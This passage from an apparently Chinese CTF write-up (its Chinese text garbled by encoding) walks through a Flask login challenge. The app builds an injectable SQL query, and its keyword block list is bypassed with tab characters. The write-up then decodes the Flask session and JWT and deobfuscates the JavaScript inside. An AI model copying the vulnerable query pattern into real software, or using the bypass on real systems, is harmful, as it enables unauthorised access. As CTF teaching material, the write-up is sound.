            <span class="token string">"/or"</span><span class="token punctuation">,</span>
            <span class="token string">" and"</span><span class="token punctuation">,</span>
            <span class="token string">"'and"</span><span class="token punctuation">,</span>
            <span class="token string">"/and"</span><span class="token punctuation">,</span>
            <span class="token string">"'like"</span><span class="token punctuation">,</span>
            <span class="token string">" like"</span><span class="token punctuation">,</span>
            <span class="token string">"/like"</span><span class="token punctuation">,</span>
            <span class="token string">"'where"</span><span class="token punctuation">,</span>
            <span class="token string">" where"</span><span class="token punctuation">,</span>
            <span class="token string">"/where"</span><span class="token punctuation">,</span>
            <span class="token string">"%00"</span><span class="token punctuation">,</span>
            <span class="token string">"null"</span><span class="token punctuation">,</span>
            <span class="token string">"admin'"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span>
        matching_value <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span>
                value
                <span class="token keyword">for</span> value <span class="token keyword">in</span> invalid_entries
                <span class="token keyword">if</span> value <span class="token keyword">in</span> loweruser <span class="token keyword">or</span> value <span class="token keyword">in</span> lowerpass
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token boolean">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
        <span class="token keyword">if</span> matching_value<span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token punctuation">(</span>
                <span class="token string-interpolation"><span class="token string">f"Invalid entry in username and/or password fields. Please try again."</span></span>
            <span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>

        conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"chal.db"</span><span class="token punctuation">)</span>
        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>

        query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT secret FROM login_details WHERE username = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">' AND password = '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">';"</span></span>

        result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">)</span>
        user <span class="token operator">=</span> result<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>

        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> user<span class="token punctuation">:</span>
            session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
            session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username
            session<span class="token punctuation">[</span><span class="token string">"secret"</span><span class="token punctuation">]</span> <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"profile"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">"Invalid login credentials. Please try again."</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>

    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"landing.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/profile"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        secret <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"secret"</span><span class="token punctuation">)</span>
        key <span class="token operator">=</span> <span class="token string">"0"</span>
        <span class="token keyword">if</span> <span class="token string">"secret"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">:</span>
            key <span class="token operator">=</span> <span class="token string">"1"</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span>
            <span class="token string">"profile.html"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> secret<span class="token operator">=</span>secret<span class="token punctuation">,</span> key<span class="token operator">=</span>key
        <span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        error <span class="token operator">=</span> <span class="token string">"You are not logged in. Please log in first."</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
<span class="token keyword">def</span> <span class="token function">add_cache_control</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Cache-Control"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-store, no-cache, must-revalidate, max-age=0"</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Pragma"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"no-cache"</span>
    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Expires"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-1"</span>
    <span class="token keyword">return</span> response


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>é€šè¿‡å¯¹ä»£ç è¿›è¡Œå®¡è®¡å¯ä»¥çœ‹åˆ°å†loginè·¯ç”±ä¸‹å­˜åœ¨SQLæ³¨å…¥ï¼Œä¹Ÿå°±æ˜¯ç™»å½•å¤„ï¼Œä½†æ˜¯å¯¹å­—ç¬¦è¿›è¡Œäº†ç™½åå•é™åˆ¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"logged_in"</span> <span class="token keyword">in</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">"logged_in"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"logged_in"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        loweruser <span class="token operator">=</span> username<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        lowerpass <span class="token operator">=</span> password<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
        invalid_entries <span class="token operator">=</span> invalid_entries <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"//"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"'1"</span><span class="token punctuation">,</span> <span class="token string">" 1"</span><span class="token punctuation">,</span> <span class="token string">" true"</span><span class="token punctuation">,</span> <span class="token string">"'true"</span><span class="token punctuation">,</span> <span class="token string">" or"</span><span class="token punctuation">,</span> <span class="token string">"'or"</span><span class="token punctuation">,</span> <span class="token string">"/or"</span><span class="token punctuation">,</span> <span class="token string">" and"</span><span class="token punctuation">,</span> <span class="token string">"'and"</span><span class="token punctuation">,</span> <span class="token string">"/and"</span><span class="token punctuation">,</span> <span class="token string">"'like"</span><span class="token punctuation">,</span> <span class="token string">" like"</span><span class="token punctuation">,</span> <span class="token string">"/like"</span><span class="token punctuation">,</span> <span class="token string">"'where"</span><span class="token punctuation">,</span> <span class="token string">" where"</span><span class="token punctuation">,</span> <span class="token string">"/where"</span><span class="token punctuation">,</span> <span class="token string">"%00"</span><span class="token punctuation">,</span> <span class="token string">"null"</span><span class="token punctuation">,</span> <span class="token string">"admin'"</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å°è¯•ä½¿ç”¨tabé”®æ¥ç»•è¿‡ç©ºæ ¼ï¼ˆspaceï¼‰<br><img src="https://img-blog.csdnimg.cn/direct/93bfeaf0295c43d48ef70cbd87a486ad.png" alt="123"><br>å‘ç°èƒ½å¤ŸæˆåŠŸç™»å½•<br><img src="https://img-blog.csdnimg.cn/direct/52755f94cb094aa9a92e157b803d8a97.png" alt="123"><br>ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆï¼Œç»“åˆæºç è¿˜ç»™äº†ä¸€ä¸ªSQLæ–‡ä»¶</p>
<p><strong>schema_sql</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> login_details <span class="token punctuation">(</span>
    id <span class="token keyword">INTEGER</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> AUTOINCREMENT<span class="token punctuation">,</span>
    username <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
    password <span class="token keyword">TEXT</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span>
<span class="token punctuation">,</span> secret <span class="token keyword">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å°è¯•æŸ¥çœ‹ä¸€ä¸‹secretå­—æ®µ<br><img src="https://img-blog.csdnimg.cn/direct/b91ec43d9b3841cb9fa9d01fdbca11e5.png" alt="465"><br>è¿™æ—¶å€™å‘ç°sessionå†…å®¹å˜å¤šäº†ï¼Œç»“åˆå‰é¢ç™»é™†æˆåŠŸæ‰€ç»™çš„secretï¼Œä¸å…ä¼šæƒ³åˆ°sessionç›¸å…³é¢˜ç›®ï¼Œå°†æ­¤å¤„çš„sessionè¿›è¡Œè§£ç ä½¿ç”¨<code>flask-unsign</code><br><img src="https://img-blog.csdnimg.cn/direct/bb4db8d78a7941d9a60ca39d80f62c98.png" alt="456"><br>å°†å¾—åˆ°çš„å¯†æ–‡è¿›è¡ŒJWTè§£ç <br><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmbGFnIjoibml0ZXtpc190aGlzX3RoZV9mbGFnP30iLCJuYW1lIjoiVHJ5IGFuZCBnZXQgdGhlIGZsYWchIiwiZGVzYyI6IihmdW5jdGlvbihfMHhkOGZiZGIsXzB4MjQyNDgzKXt2YXIgXzB4NTVkYzdjPV8weDNlN2QsXzB4M2FlZmExPV8weGQ4ZmJkYigpO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4M2Q3ODQ3PS1wYXJzZUludChfMHg1NWRjN2MoMHg5MikpLzB4MSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTYpKS8weDIpK3BhcnNlSW50KF8weDU1ZGM3YygweDhlKSkvMHgzKigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OTMpKS8weDQpK3BhcnNlSW50KF8weDU1ZGM3YygweDk0KSkvMHg1K3BhcnNlSW50KF8weDU1ZGM3YygweDhmKSkvMHg2KigtcGFyc2VJbnQoXzB4NTVkYzdjKDB4OGIpKS8weDcpK3BhcnNlSW50KF8weDU1ZGM3YygweDkxKSkvMHg4Ky1wYXJzZUludChfMHg1NWRjN2MoMHg4YykpLzB4OSoocGFyc2VJbnQoXzB4NTVkYzdjKDB4OTUpKS8weGEpK3BhcnNlSW50KF8weDU1ZGM3YygweDkwKSkvMHhiO2lmKF8weDNkNzg0Nz09PV8weDI0MjQ4MylicmVhaztlbHNlIF8weDNhZWZhMVsncHVzaCddKF8weDNhZWZhMVsnc2hpZnQnXSgpKTt9Y2F0Y2goXzB4NGIyODljKXtfMHgzYWVmYTFbJ3B1c2gnXShfMHgzYWVmYTFbJ3NoaWZ0J10oKSk7fX19KF8weDQ0ZTcsMHhiNGJmMSkpO2Z1bmN0aW9uIF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCl7dmFyIF8weDQ0ZTc3Yz1fMHg0NGU3KCk7cmV0dXJuIF8weDNlN2Q9ZnVuY3Rpb24oXzB4M2U3ZGU2LF8weDMxZmViYyl7XzB4M2U3ZGU2PV8weDNlN2RlNi0weDhiO3ZhciBfMHg1ZTU4NTA9XzB4NDRlNzdjW18weDNlN2RlNl07cmV0dXJuIF8weDVlNTg1MDt9LF8weDNlN2QoXzB4M2JjYTMzLF8weDIxZjY0OCk7fWZ1bmN0aW9uIHd1dF9pc190aGlzX25vdygpe3ZhciBfMHg1OTQ5NTY9XzB4M2U3ZDtjb25zb2xlWydsb2cnXShfMHg1OTQ5NTYoMHg4ZCkpO31mdW5jdGlvbiBfMHg0NGU3KCl7dmFyIF8weDQ1ZDA4ZT1bJzlsbENnTm8nLCdhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMmx6YUdGdUxYTjFjbUZ1WVM5amFHRnNiR1Z1WjJVdicsJzkyNG9mb3BKQicsJzE1NzA5OHR0REd2YScsJzI0MjU3Mjc3YW1kc2RZJywnNDY1NzY4MFdhaWNKRCcsJzh4SHRxc2QnLCcxNjI1Mld6cWZjcycsJzExOTg3OTVlVUFmSUQnLCc0MDI1MTEwR1hveWJNJywnNzk2ODJRU254c1MnLCc4NHhCSnNzdyddO18weDQ0ZTc9ZnVuY3Rpb24oKXtyZXR1cm4gXzB4NDVkMDhlO307cmV0dXJuIF8weDQ0ZTcoKTt9IiwiaWF0IjoxNTE2MjM5MDIyfQ.bTHY_Rrkc2mn2xwJe1tP_PeGUftqNoWZFLO2yBH2B5Q</code></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"header"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"alg"</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span>
    <span class="token property">"typ"</span><span class="token operator">:</span> <span class="token string">"JWT"</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token property">"payload"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">"flag"</span><span class="token operator">:</span> <span class="token string">"nite&#123;is_this_the_flag?&#125;"</span><span class="token punctuation">,</span>
    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Try and get the flag!"</span><span class="token punctuation">,</span>
    <span class="token property">"desc"</span><span class="token operator">:</span> <span class="token string">"(function(_0xd8fbdb,_0x242483)&#123;var _0x55dc7c=_0x3e7d,_0x3aefa1=_0xd8fbdb();while(!![])&#123;try&#123;var _0x3d7847=-parseInt(_0x55dc7c(0x92))/0x1*(parseInt(_0x55dc7c(0x96))/0x2)+parseInt(_0x55dc7c(0x8e))/0x3*(-parseInt(_0x55dc7c(0x93))/0x4)+parseInt(_0x55dc7c(0x94))/0x5+parseInt(_0x55dc7c(0x8f))/0x6*(-parseInt(_0x55dc7c(0x8b))/0x7)+parseInt(_0x55dc7c(0x91))/0x8+-parseInt(_0x55dc7c(0x8c))/0x9*(parseInt(_0x55dc7c(0x95))/0xa)+parseInt(_0x55dc7c(0x90))/0xb;if(_0x3d7847===_0x242483)break;else _0x3aefa1['push'](_0x3aefa1['shift']());&#125;catch(_0x4b289c)&#123;_0x3aefa1['push'](_0x3aefa1['shift']());&#125;&#125;&#125;(_0x44e7,0xb4bf1));function _0x3e7d(_0x3bca33,_0x21f648)&#123;var _0x44e77c=_0x44e7();return _0x3e7d=function(_0x3e7de6,_0x31febc)&#123;_0x3e7de6=_0x3e7de6-0x8b;var _0x5e5850=_0x44e77c[_0x3e7de6];return _0x5e5850;&#125;,_0x3e7d(_0x3bca33,_0x21f648);&#125;function wut_is_this_now()&#123;var _0x594956=_0x3e7d;console['log'](_0x594956(0x8d));&#125;function _0x44e7()&#123;var _0x45d08e=['9llCgNo','aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv','924ofopJB','157098ttDGva','24257277amdsdY','4657680WaicJD','8xHtqsd','16252Wzqfcs','1198795eUAfID','4025110GXoybM','79682QSnxsS','84xBJssw'];_0x44e7=function()&#123;return _0x45d08e;&#125;;return _0x44e7();&#125;"</span><span class="token punctuation">,</span>
    <span class="token property">"iat"</span><span class="token operator">:</span> <span class="token number">1516239022</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯çœ‹å‡º<code>desc</code>å¤„å¯¹ä»£ç è¿›è¡Œäº†æ··æ·†ï¼Œå°è¯•åæ··æ·†</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json">(function(topic<span class="token punctuation">,</span> b) <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>
  var getter = _0x3e7d;
  var out = topic();
  for (;!!<span class="token punctuation">[</span><span class="token punctuation">]</span>;) <span class="token punctuation">&#123;</span>
    try <span class="token punctuation">&#123;</span>
      <span class="token comment">/** @type &#123;number&#125; */</span>
      var a = -parseInt(getter(<span class="token number">146</span>)) / <span class="token number">1</span> * (parseInt(getter(<span class="token number">150</span>)) / <span class="token number">2</span>) + parseInt(getter(<span class="token number">142</span>)) / <span class="token number">3</span> * (-parseInt(getter(<span class="token number">147</span>)) / <span class="token number">4</span>) + parseInt(getter(<span class="token number">148</span>)) / <span class="token number">5</span> + parseInt(getter(<span class="token number">143</span>)) / <span class="token number">6</span> * (-parseInt(getter(<span class="token number">139</span>)) / <span class="token number">7</span>) + parseInt(getter(<span class="token number">145</span>)) / <span class="token number">8</span> + -parseInt(getter(<span class="token number">140</span>)) / <span class="token number">9</span> * (parseInt(getter(<span class="token number">149</span>)) / <span class="token number">10</span>) + parseInt(getter(<span class="token number">144</span>)) / <span class="token number">11</span>;
      if (a === b) <span class="token punctuation">&#123;</span>
        break;
      <span class="token punctuation">&#125;</span> else <span class="token punctuation">&#123;</span>
        out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> catch (_0x4b289c) <span class="token punctuation">&#123;</span>
      out<span class="token punctuation">[</span><span class="token string">"push"</span><span class="token punctuation">]</span>(out<span class="token punctuation">[</span><span class="token string">"shift"</span><span class="token punctuation">]</span>());
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>)(_0x44e7<span class="token punctuation">,</span> <span class="token number">740337</span>);
<span class="token comment">/**
 * @param &#123;number&#125; opt_attributes
 * @param &#123;?&#125; deepDataAndEvents
 * @return &#123;?&#125;
 */</span>
function _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>
  var args = _0x44e7();
  return _0x3e7d = function(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents) <span class="token punctuation">&#123;</span>
    <span class="token comment">/** @type &#123;number&#125; */</span>
    opt_attributes = opt_attributes - <span class="token number">139</span>;
    var pageY = args<span class="token punctuation">[</span>opt_attributes<span class="token punctuation">]</span>;
    return pageY;
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> _0x3e7d(opt_attributes<span class="token punctuation">,</span> deepDataAndEvents);
<span class="token punctuation">&#125;</span>
<span class="token comment">/**
 * @return &#123;undefined&#125;
 */</span>
function wut_is_this_now() <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;function (number, ?): ?&#125; */</span>
  var prepArgs = _0x3e7d;
  console<span class="token punctuation">[</span><span class="token string">"log"</span><span class="token punctuation">]</span>(prepArgs(<span class="token number">141</span>));
<span class="token punctuation">&#125;</span>
<span class="token comment">/**
 * @return &#123;?&#125;
 */</span>
function _0x44e7() <span class="token punctuation">&#123;</span>
  <span class="token comment">/** @type &#123;Array&#125; */</span>
  var aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv = <span class="token punctuation">[</span><span class="token string">"9llCgNo"</span><span class="token punctuation">,</span> <span class="token string">"aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv"</span><span class="token punctuation">,</span> <span class="token string">"924ofopJB"</span><span class="token punctuation">,</span> <span class="token string">"157098ttDGva"</span><span class="token punctuation">,</span> <span class="token string">"24257277amdsdY"</span><span class="token punctuation">,</span> <span class="token string">"4657680WaicJD"</span><span class="token punctuation">,</span> <span class="token string">"8xHtqsd"</span><span class="token punctuation">,</span> <span class="token string">"16252Wzqfcs"</span><span class="token punctuation">,</span> <span class="token string">"1198795eUAfID"</span><span class="token punctuation">,</span> <span class="token string">"4025110GXoybM"</span><span class="token punctuation">,</span> <span class="token string">"79682QSnxsS"</span><span class="token punctuation">,</span> <span class="token string">"84xBJssw"</span><span class="token punctuation">]</span>;
  <span class="token comment">/**
   * @return &#123;?&#125;
   */</span>
  _0x44e7 = function() <span class="token punctuation">&#123;</span>
    return aHR0cHM6Ly9naXRodWIuY29tL2lzaGFuLXN1cmFuYS9jaGFsbGVuZ2Uv;<span class="token comment">//base64è§£ç ä¸ºhttps://github.com/ishan-surana/challenge/</span>
  <span class="token punctuation">&#125;</span>;
  return _0x44e7();
<span class="token punctuation">&#125;</span>
;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flagå°±åœ¨é‡Œé¢ï¼Œä½†æ˜¯ç”±äºæ¯”èµ›ç»“æŸï¼Œflagå·²ç»åˆ é™¤ã€‚ã€‚ã€‚</p>
<h2 id="jsæ··æ·†ä¸åæ··æ·†"><a href="#jsæ··æ·†ä¸åæ··æ·†" class="headerlink" title="jsæ··æ·†ä¸åæ··æ·†"></a>jsæ··æ·†ä¸åæ··æ·†</h2><h3 id="JSæ··æ·†"><a href="#JSæ··æ·†" class="headerlink" title="JSæ··æ·†"></a><strong>JSæ··æ·†</strong></h3><p>JavaScriptæ··æ·†æ˜¯ä¸€ç§é€šè¿‡ä¿®æ”¹æºä»£ç ï¼Œä½¿å…¶éš¾ä»¥é˜…è¯»å’Œç†è§£çš„æŠ€æœ¯ã€‚è¿™ç§æŠ€æœ¯çš„ç›®çš„æ˜¯å¢åŠ ä»£ç çš„å¤æ‚æ€§ï¼Œä»è€Œé˜²æ­¢é€†å‘å·¥ç¨‹ã€å‡ç¼“æ¶æ„æ”»å‡»å’Œé˜²æ­¢æœªç»æˆæƒçš„å¤åˆ¶ã€‚æ··æ·†é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<ol>
<li><strong>å˜é‡å’Œå‡½æ•°åé‡å‘½åï¼š</strong> å°†ä»£ç ä¸­çš„å˜é‡åå’Œå‡½æ•°åæ›¿æ¢ä¸ºæ— æ„ä¹‰ã€çŸ­å°æˆ–éš¾ä»¥ç†è§£çš„åç§°ã€‚</li>
<li><strong>æ§åˆ¶æµæ··æ·†ï¼š</strong> ä¿®æ”¹ä»£ç çš„æ§åˆ¶æµç¨‹ï¼Œä½¿å…¶å˜å¾—å¤æ‚å’Œéš¾ä»¥åˆ†æã€‚è¿™å¯èƒ½åŒ…æ‹¬æ·»åŠ æ— ç”¨çš„åˆ†æ”¯ã€æ¡ä»¶è¯­å¥é‡ç»„ç­‰ã€‚</li>
<li><strong>å­—ç¬¦ä¸²å’Œå¸¸é‡åŠ å¯†ï¼š</strong> å°†å­—ç¬¦ä¸²å’Œå¸¸é‡è¿›è¡ŒåŠ å¯†æˆ–ç¼–ç ï¼Œä½¿å…¶åœ¨è¿è¡Œæ—¶åŠ¨æ€è§£ç ï¼Œå¢åŠ ä»£ç åˆ†æçš„éš¾åº¦ã€‚</li>
